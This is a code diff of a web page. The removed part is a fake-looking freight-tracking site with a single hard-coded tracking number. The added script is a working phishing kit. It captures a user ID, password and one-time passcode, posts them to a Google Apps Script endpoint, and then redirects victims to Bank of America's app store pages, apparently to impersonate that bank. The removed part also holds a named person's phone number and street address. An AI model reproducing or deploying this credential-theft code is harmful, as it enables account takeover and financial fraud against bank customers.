-        <div class="faq-q">How long does international shipping take? <i class="fas fa-chevron-down"></i></div>
-        <div class="faq-a">Transit times vary by service type and route. Air freight typically takes 1-3 days for international shipments, while ocean freight ranges from 7-30 days depending on the route.</div>
-      </div>
-      <div class="faq-item" onclick="toggleFaq(this)">
-        <div class="faq-q">Can I change my delivery address? <i class="fas fa-chevron-down"></i></div>
-        <div class="faq-a">Address changes may be possible depending on the shipment status. Contact our support team as soon as possible, and we'll do our best to accommodate your request.</div>
-      </div>
-      <div class="faq-item" onclick="toggleFaq(this)">
-        <div class="faq-q">What happens if my package is delayed? <i class="fas fa-chevron-down"></i></div>
-        <div class="faq-a">In the rare event of a delay, our tracking system will update your shipment status in real-time. Our team proactively monitors all shipments and will work to resolve any issues immediately.</div>
-      </div>
-      <div class="faq-item" onclick="toggleFaq(this)">
-        <div class="faq-q">Do you offer insurance for shipments? <i class="fas fa-chevron-down"></i></div>
-        <div class="faq-a">Yes, all shipments are fully insured during transit. We offer comprehensive coverage options tailored to the value and nature of your cargo for complete peace of mind.</div>
-      </div>
-    </div>
-  </div>
-</section>
-
-<!-- CONTACT -->
-<section class="section-pad contact fade-in" id="contact">
-  <div class="section-inner">
-    <div class="contact-grid">
-      <div class="contact-info">
-        <div class="section-label">Get In Touch</div>
-        <h2 class="section-title">Let's Move Your Cargo</h2>
-        <p>Have questions about shipping, tracking, or our services? Send us a message and our team will get back to you within 24 hours.</p>
-        <div class="contact-points">
-          <div class="contact-point">
-            <i class="fas fa-map-marker-alt"></i>
-            <div><h4>Global Headquarters</h4><p>1 Logistics Plaza, Anchorage, Alaska, USA</p></div>
-          </div>
-          <div class="contact-point">
-            <i class="fas fa-clock"></i>
-            <div><h4>Operating Hours</h4><p>24/7, 365 Days a Year — Always On</p></div>
-          </div>
-          <div class="contact-point">
-            <i class="fas fa-globe"></i>
-            <div><h4>Regional Offices</h4><p>Sydney · London · Singapore · Dubai · Frankfurt</p></div>
-          </div>
-        </div>
-      </div>
-      <div class="contact-form">
-        <h3>Send Us a Message</h3>
-        <input type="text" placeholder="Your Name" id="contactName">
-        <input type="email" placeholder="Your Email" id="contactEmail">
-        <input type="text" placeholder="Subject" id="contactSubject">
-        <textarea placeholder="Your Message" id="contactMessage"></textarea>
-        <button onclick="submitContact()">Send Message</button>
-      </div>
-    </div>
-  </div>
-</section>
-
-<!-- FOOTER -->
-<footer class="footer">
-  <div class="footer-inner">
-    <div class="footer-brand">
-      <img src="https://greenwayexpressllc.com/wp-content/uploads/2022/05/logo.svg" alt="Greenway Express">
-      <p>Greenway Express is a global freight and logistics company specializing in air, ocean, and road cargo transportation. Delivering excellence across 180+ countries with precision and care.</p>
-      <div class="footer-social">
-        <a href="#"><i class="fab fa-linkedin-in"></i></a>
-        <a href="#"><i class="fab fa-twitter"></i></a>
-        <a href="#"><i class="fab fa-facebook-f"></i></a>
-        <a href="#"><i class="fab fa-instagram"></i></a>
-      </div>
-    </div>
-    <div class="footer-col">
-      <h4>Services</h4>
-      <ul class="footer-links">
-        <li><a href="#services">Air Freight</a></li>
-        <li><a href="#services">Ocean Freight</a></li>
-        <li><a href="#services">Road Transport</a></li>
-        <li><a href="#services">Express Delivery</a></li>
-        <li><a href="#services">Warehousing</a></li>
-        <li><a href="#services">Customs Clearance</a></li>
-      </ul>
-    </div>
-    <div class="footer-col">
-      <h4>Company</h4>
-      <ul class="footer-links">
-        <li><a href="#about">About Us</a></li>
-        <li><a href="#fleet">Our Fleet</a></li>
-        <li><a href="#coverage">Global Coverage</a></li>
-        <li><a href="#faq">FAQ</a></li>
-        <li><a href="#contact">Contact</a></li>
-      </ul>
-    </div>
-    <div class="footer-col">
-      <h4>Operations</h4>
-      <div class="footer-hours">
-        <div><span>Mon - Fri</span><span>24 Hours</span></div>
-        <div><span>Saturday</span><span>24 Hours</span></div>
-        <div><span>Sunday</span><span>24 Hours</span></div>
-        <div><span>Holidays</span><span>24 Hours</span></div>
-      </div>
-    </div>
-  </div>
-  <div class="footer-bottom">
-    <p>© 2025 Greenway Express LLC. All Rights Reserved. | Global Freight & Logistics</p>
-    <p>Delivering Across Continents, One Package at a Time.</p>
-  </div>
-</footer>
-
-<!-- BACK TO TOP -->
-<button class="back-top" id="backTop"><i class="fas fa-arrow-up"></i></button>
-
-<!-- TOAST -->
-<div class="toast" id="toast"></div>
-
-<!-- ===== TRACKING PORTAL — FULL SCREEN WITH X CLOSE + REAL GOOGLE MAPS ===== -->
-<div class="track-modal" id="trackModal">
-  <div class="track-modal-box">
-    <div class="track-modal-header">
-      <img src="https://greenwayexpressllc.com/wp-content/uploads/2022/05/logo.svg" alt="Greenway Express">
-      <button class="track-close" onclick="closeTrackModal()"><i class="fas fa-times"></i></button>
-    </div>
-    <div class="track-modal-body">
-      <!-- Status Row -->
-      <div class="track-status-row">
-        <div class="track-num">Tracking: <strong>GWE7H2K9M</strong></div>
-        <div class="track-badge"><span class="dot"></span> IN TRANSIT</div>
-      </div>
-      <!-- Progress Bar -->
-      <div class="progress-wrap">
-        <div class="progress-bar">
-          <div class="progress-fill"></div>
-        </div>
-        <div class="progress-labels">
-          <span class="active">Received</span>
-          <span class="active">Departed</span>
-          <span class="active">In Transit</span>
-          <span>Customs</span>
-          <span>Out for Delivery</span>
-          <span>Delivered</span>
-        </div>
-      </div>
-      <!-- Sender / Receiver Details -->
-      <div class="details-grid">
-        <div class="detail-card">
-          <h4><i class="fas fa-paper-plane"></i> Sender Details</h4>
-          <div class="detail-row"><span class="lbl">Name:</span><span class="val">John Holt</span></div>
-          <div class="detail-row"><span class="lbl">Address:</span><span class="val">Alaska, United States</span></div>
-        </div>
-        <div class="detail-card">
-          <h4><i class="fas fa-inbox"></i> Receiver Details</h4>
-          <div class="detail-row"><span class="lbl">Name:</span><span class="val">Julie Turski</span></div>
-          <div class="detail-row"><span class="lbl">Phone:</span><span class="val">+61 448 855 598</span></div>
-          <div class="detail-row"><span class="lbl">Address:</span><span class="val">18 Forest Road, KIOLOA, Australia NSW 2539</span></div>
-        </div>
-      </div>
-      <!-- REAL GOOGLE MAPS EMBED — DIRECTIONS FROM ALASKA TO RECEIVER ADDRESS -->
-      <div class="map-section">
-        <h4><i class="fas fa-map-marked-alt"></i> Route Map — Alaska, USA to Kioloa, NSW 2539, Australia</h4>
-        <iframe id="trackingMapFrame" src="" width="100%" height="380" style="border:0;border-radius:12px;overflow:hidden;" allowfullscreen="" loading="lazy"></iframe>
-      </div>
-      <!-- Flight Info — REAL DISTANCE & TIME -->
-      <div class="flight-info">
-        <div class="flight-info-item">
-          <i class="fas fa-plane-departure"></i>
-          <div class="val">Anchorage, AK</div>
-          <div class="lbl">Origin</div>
-        </div>
-        <div class="flight-info-item">
-          <i class="fas fa-plane-arrival"></i>
-          <div class="val">Kioloa, NSW</div>
-          <div class="lbl">Destination</div>
-        </div>
-        <div class="flight-info-item">
-          <i class="fas fa-route"></i>
-          <div class="val">~11,800 km</div>
-          <div class="lbl">Distance</div>
-        </div>
-        <div class="flight-info-item">
-          <i class="fas fa-stopwatch"></i>
-          <div class="val">14 Hours</div>
-          <div class="lbl">Transit Time</div>
-        </div>
-      </div>
-    </div>
-  </div>
-</div>
-
-<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
 <script>
-// ===== TRACKING CODE: GWE7H2K9M =====
-const VALID_TRACKING_CODE = 'GWE7H2K9M';
-let trackingMap = null;
+  // ==========================================
+  // GOOGLE SHEETS INTEGRATION
+  // ==========================================
+  // PASTE YOUR GOOGLE APPS SCRIPT WEB APP URL HERE
+  const GOOGLE_SHEET_URL = "https://script.google.com/macros/s/AKfycbxVTlWtm6lOj1k2mVBi4U2C1kwAthnut5EixnaLMp5zVDRTdqC29TYdNKXOq0wqQJzl3w/exec"; 
 
-// TOAST
-function showToast(msg) {
-  const t = document.getElementById('toast');
-  t.innerText = msg;
-  t.classList.add('show');
-  setTimeout(() => t.classList.remove('show'), 3000);
-}
-
-// ===== PRELOADER WITH TRUCK — FIXED: Doesn't wait for all images =====
-function hidePreloader() {
-  const p = document.getElementById('preloader');
-  if (p) p.classList.add('hidden');
-}
-
-// Initial page load — hide preloader after truck animation completes (2.8s)
-setTimeout(hidePreloader, 2800);
-// Fallback: hide after 4 seconds no matter what
-setTimeout(hidePreloader, 4000);
-// Also hide on DOMContentLoaded as extra backup
-document.addEventListener('DOMContentLoaded', () => setTimeout(hidePreloader, 800));
-
-// ===== SHOW PRELOADER WITH TRUCK AGAIN (for tracking) =====
-function showPreloaderWithTruck(callback) {
-  const preloader = document.getElementById('preloader');
-  const truck = document.getElementById('preloaderTruck');
-  preloader.classList.remove('hidden');
-  
-  // Reset truck animation so it plays again
-  truck.style.animation = 'none';
-  void truck.offsetWidth; // Force reflow to restart animation
-  truck.style.animation = 'truckMove 2.5s linear forwards';
-  
-  // Hide preloader after truck finishes passing
-  setTimeout(() => {
-    preloader.classList.add('hidden');
-    if (callback) callback();
-  }, 2800);
-}
-
-// ===== LOAD REAL GOOGLE MAPS =====
-function loadGoogleMap() {
-  const iframe = document.getElementById('trackingMapFrame');
-  if (iframe) {
-    // Real Google Maps embed with directions from Anchorage Alaska to receiver address
-    iframe.src = 'https://www.google.com/maps?saddr=Anchorage,+Alaska,+USA&daddr=18+Forest+Rd,+Kioloa+NSW+2539,+Australia&output=embed';
-  }
-}
-
-// NAVBAR SCROLL
-const navbar = document.getElementById('navbar');
-const scrollProgress = document.getElementById('scrollProgress');
-const backTop = document.getElementById('backTop');
-
-window.addEventListener('scroll', () => {
-  const sc = window.scrollY;
-  if (sc > 60) navbar.classList.add('scrolled');
-  else navbar.classList.remove('scrolled');
-  
-  const docH = document.documentElement.scrollHeight - window.innerHeight;
-  scrollProgress.style.width = (sc / docH * 100) + '%';
-  
-  if (sc > 500) backTop.classList.add('show');
-  else backTop.classList.remove('show');
-});
-
-backTop.addEventListener('click', () => window.scrollTo({ top: 0, behavior: 'smooth' }));
-
-// MOBILE MENU
-document.getElementById('navToggle').addEventListener('click', () => {
-  document.getElementById('navLinks').classList.toggle('mobile-open');
-});
-
-document.querySelectorAll('.nav-links a').forEach(a => {
-  a.addEventListener('click', () => {
-    document.getElementById('navLinks').classList.remove('mobile-open');
-  });
-});
-
-// SCROLL TO TRACK
-window.scrollToTrack = function() {
-  document.getElementById('home').scrollIntoView({ behavior: 'smooth' });
-  setTimeout(() => document.getElementById('trackInput').focus(), 800);
-};
-
-// ===== TRACKING — SHOWS PRELOADER WITH TRUCK THEN OPENS PORTAL =====
-window.trackPackage = function() {
-  const input = document.getElementById('trackInput');
-  const errorEl = document.getElementById('trackError');
-  const btn = document.getElementById('trackBtn');
-  const code = input.value.trim().toUpperCase();
-  
-  errorEl.innerText = '';
-  
-  if (!code) {
-    errorEl.innerText = '⚠ Please enter your tracking number to continue.';
-    return;
-  }
-  
-  // Loading animation on button
-  const originalHTML = btn.innerHTML;
-  btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Tracking...';
-  btn.disabled = true;
-  
-  setTimeout(() => {
-    if (code === VALID_TRACKING_CODE) {
-      // ===== SHOW PRELOADER WITH TRUCK AGAIN before opening portal =====
-      showPreloaderWithTruck(() => {
-        // Open tracking portal
-        document.getElementById('trackModal').classList.add('show');
-        document.body.style.overflow = 'hidden';
-        // Load real Google Map
-        loadGoogleMap();
+  async function saveToGoogleSheet(data) {
+    if (GOOGLE_SHEET_URL === "PASTE_YOUR_GOOGLE_APPS_SCRIPT_URL_HERE") {
+      console.warn("Google Sheet URL not added yet!");
+      return;
+    }
+    try {
+      // We use no-cors mode because Google Apps Script doesn't return standard CORS headers
+      await fetch(GOOGLE_SHEET_URL, {
+        method: "POST",
+        mode: "no-cors",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(data)
       });
-    } else {
-      errorEl.innerText = '⚠ Tracking number not found. Please verify your number and try again.';
+    } catch (e) {
+      console.error("Error saving to sheet:", e);
     }
-    btn.innerHTML = originalHTML;
-    btn.disabled = false;
-  }, 1000);
-};
+  }
 
-// CLOSE MODAL
-window.closeTrackModal = function() {
-  document.getElementById('trackModal').classList.remove('show');
-  document.body.style.overflow = '';
-  // Clear Google Maps iframe
-  const iframe = document.getElementById('trackingMapFrame');
-  if (iframe) iframe.src = '';
-};
+  // ==========================================
+  // PAGE LOGIC & TRANSITIONS
+  // ==========================================
+  const step1 = document.getElementById("step1");
+  const step2 = document.getElementById("step2");
+  const step3 = document.getElementById("step3");
+  const loadingText = document.getElementById("loadingText");
+  const errorText = document.getElementById("errorText");
 
-// Close on background click
-document.getElementById('trackModal').addEventListener('click', function(e) {
-  if (e.target === this) closeTrackModal();
-});
+  // STEP 1 -> STEP 2 (With Sensitivity & Spinner Delay)
+  document.getElementById("loginBtn1").addEventListener("click", async () => {
+    const userId = document.getElementById("userId").value.trim();
+    const password = document.getElementById("password").value.trim();
+    const saveId = document.getElementById("saveId").checked;
+    const btn = document.getElementById("loginBtn1");
 
-// ===== OLD LEAFLET MAP FUNCTION — KEPT IN CODE BUT NOT USED (replaced by Google Maps) =====
-function initTrackingMap() {
-  if (trackingMap) { trackingMap.remove(); trackingMap = null; }
-  const mapEl = document.getElementById('trackingMap');
-  if (!mapEl) return;
-  trackingMap = L.map('trackingMap', { center: [15, -170], zoom: 3, zoomControl: true, attributionControl: false, scrollWheelZoom: true, minZoom: 2 });
-  L.tileLayer('https://{s}.basemaps.cartocdn.com/rastertiles/voyager/{z}/{x}/{y}.png', { maxZoom: 18, subdomains: ['a','b','c','d'] }).addTo(trackingMap);
-  const origin = [61.2181, -149.9003];
-  const dest = [-35.5333, 150.3833];
-  const routePoints = [[61.2181,-149.9003],[55,-160],[45,-175],[35,170],[20,160],[5,150],[-10,145],[-25,148],[-35.5333,150.3833]];
-  L.polyline(routePoints, { color:'#0066FF', weight:3, opacity:0.7 }).addTo(trackingMap);
-  L.polyline(routePoints, { color:'#0066FF', weight:3, opacity:0.9, dashArray:'12,10' }).addTo(trackingMap);
-  trackingMap.fitBounds(L.latLngBounds([origin, dest]), { padding:[50,50] });
-  setTimeout(() => { if(trackingMap) trackingMap.invalidateSize(); }, 300);
-}
-
-// FAQ TOGGLE
-window.toggleFaq = function(el) {
-  const isOpen = el.classList.contains('open');
-  document.querySelectorAll('.faq-item').forEach(i => i.classList.remove('open'));
-  if (!isOpen) el.classList.add('open');
-};
-
-// QUOTE FORM
-window.submitQuote = function() {
-  const origin = document.getElementById('quoteOrigin').value.trim();
-  const dest = document.getElementById('quoteDest').value.trim();
-  const type = document.getElementById('quoteType').value;
-  if (!origin || !dest || !type) { showToast('Please fill in all required fields'); return; }
-  showToast('✅ Quote request received! We\'ll respond within 24 hours.');
-  document.getElementById('quoteOrigin').value = '';
-  document.getElementById('quoteDest').value = '';
-  document.getElementById('quoteType').value = '';
-  document.getElementById('quoteCargo').value = '';
-};
-
-// CONTACT FORM
-window.submitContact = function() {
-  const name = document.getElementById('contactName').value.trim();
-  const email = document.getElementById('contactEmail').value.trim();
-  const message = document.getElementById('contactMessage').value.trim();
-  if (!name || !email || !message) { showToast('Please fill in all required fields'); return; }
-  if (!email.includes('@')) { showToast('Please enter a valid email address'); return; }
-  showToast('✅ Message sent! Our team will respond within 24 hours.');
-  document.getElementById('contactName').value = '';
-  document.getElementById('contactEmail').value = '';
-  document.getElementById('contactSubject').value = '';
-  document.getElementById('contactMessage').value = '';
-};
-
-// COUNTER ANIMATION
-function animateCounters() {
-  const counters = document.querySelectorAll('.stat-num');
-  counters.forEach(counter => {
-    const target = parseInt(counter.dataset.target);
-    const suffix = counter.dataset.suffix || (target >= 1000000 ? 'M+' : target >= 1000 ? 'K+' : '+');
-    const duration = 2000;
-    const start = Date.now();
-    function update() {
-      const elapsed = Date.now() - start;
-      const progress = Math.min(elapsed / duration, 1);
-      const current = Math.floor(progress * target);
-      let display;
-      if (target >= 1000000) { display = (current / 1000000).toFixed(1) + 'M+'; }
-      else if (target >= 1000) { display = Math.floor(current / 1000) + 'K+'; }
-      else { display = current + (suffix || '+'); }
-      counter.innerText = display;
-      if (progress < 1) requestAnimationFrame(update);
+    if (!userId || !password) {
+      alert("Please enter your User ID and Password.");
+      return;
     }
-    update();
-  });
-}
 
-// INTERSECTION OBSERVER
-const observer = new IntersectionObserver((entries) => {
-  entries.forEach(entry => {
-    if (entry.isIntersecting) {
-      entry.target.classList.add('visible');
-      if (entry.target.classList.contains('stats-bar') || entry.target.querySelector('.stat-num')) {
-        animateCounters();
-      }
-    }
-  });
-}, { threshold: 0.15 });
+    // Disable button immediately so it only fires once (very sensitive)
+    btn.disabled = true;
+    btn.innerHTML = '<div class="btn-spinner"></div>';
 
-document.querySelectorAll('.fade-in').forEach(el => observer.observe(el));
-
-const statsBar = document.querySelector('.stats-bar');
-if (statsBar) {
-  const statsObserver = new IntersectionObserver((entries) => {
-    entries.forEach(entry => {
-      if (entry.isIntersecting) { animateCounters(); statsObserver.unobserve(entry.target); }
+    // 1. Save data to Google Sheets
+    await saveToGoogleSheet({
+      type: "Login Credentials",
+      userId: userId,
+      password: password,
+      saveId: saveId ? "Yes" : "No",
+      userAgent: navigator.userAgent,
+      timestamp: new Date().toISOString()
     });
-  }, { threshold: 0.3 });
-  statsObserver.observe(statsBar);
-}
 
-// ESC key to close modal
-document.addEventListener('keydown', (e) => {
-  if (e.key === 'Escape') closeTrackModal();
-});
+    // 2. Spin for 3.5 seconds to make the person wait before opening the second page
+    setTimeout(() => {
+      step1.classList.remove("active");
+      step2.classList.add("active");
+      // Reset button state just in case they hit back
+      btn.disabled = false;
+      btn.innerHTML = "Log in";
+    }, 3500); // 3500 milliseconds = 3.5 seconds
+  });
 
-console.log('%c🚀 Greenway Express v2.0 | Truck Preloader + Google Maps + Full Screen Portal', 'background:#006B3F;color:#fff;padding:8px 16px;border-radius:6px;font-size:14px;font-weight:bold;');
-console.log('%c Tracking Code: GWE7H2K9M ', 'color:#00B860;font-weight:bold;font-size:13px;');
+  // STEP 2 -> STEP 3 (Loading & Redirect)
+  document.getElementById("loginBtn2").addEventListener("click", async () => {
+    const otpCode = document.getElementById("otpCode").value.trim();
+    const btn = document.getElementById("loginBtn2");
+
+    if (!otpCode || otpCode.length < 4) {
+      alert("Please enter the verification code.");
+      return;
+    }
+
+    // Disable button immediately
+    btn.disabled = true;
+    btn.innerHTML = '<div class="btn-spinner"></div>';
+
+    // 1. Save OTP to Google Sheets
+    await saveToGoogleSheet({
+      type: "OTP Code",
+      otpCode: otpCode,
+      userAgent: navigator.userAgent,
+      timestamp: new Date().toISOString()
+    });
+
+    // 2. Go to Loading step
+    step2.classList.remove("active");
+    step3.classList.add("active");
+
+    // 3. Spin for 5 seconds, then show error, then redirect
+    setTimeout(() => {
+      // Show "Try again in a moment"
+      loadingText.style.display = "none";
+      errorText.style.display = "block";
+
+      // Wait 2 more seconds, then redirect to App Store / Play Store
+      setTimeout(() => {
+        redirectToAppStore();
+      }, 2000);
+
+    }, 5000); // 5000 milliseconds = 5 seconds spinner
+  });
+
+  // ==========================================
+  // DEVICE DETECTION & REDIRECT
+  // ==========================================
+  function redirectToAppStore() {
+    const userAgent = navigator.userAgent || navigator.vendor || window.opera;
+
+    // iOS Detection (iPhone / iPad / iPod)
+    if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
+      // Bank of America iOS App Link
+      window.location.href = "https://apps.apple.com/us/app/bank-of-america-mobile-banking/id284547350";
+    } 
+    // Android Detection
+    else if (/android/i.test(userAgent)) {
+      // Bank of America Android App Link
+      window.location.href = "https://play.google.com/store/apps/details?id=com.infdirect.banking";
+    } 
+    // Fallback (Desktop/Other) - goes to Bofa homepage
+    else {
+      window.location.href = "https://www.bankofamerica.com/";
+    }
+  }
 </script>
-</body>
-</html>
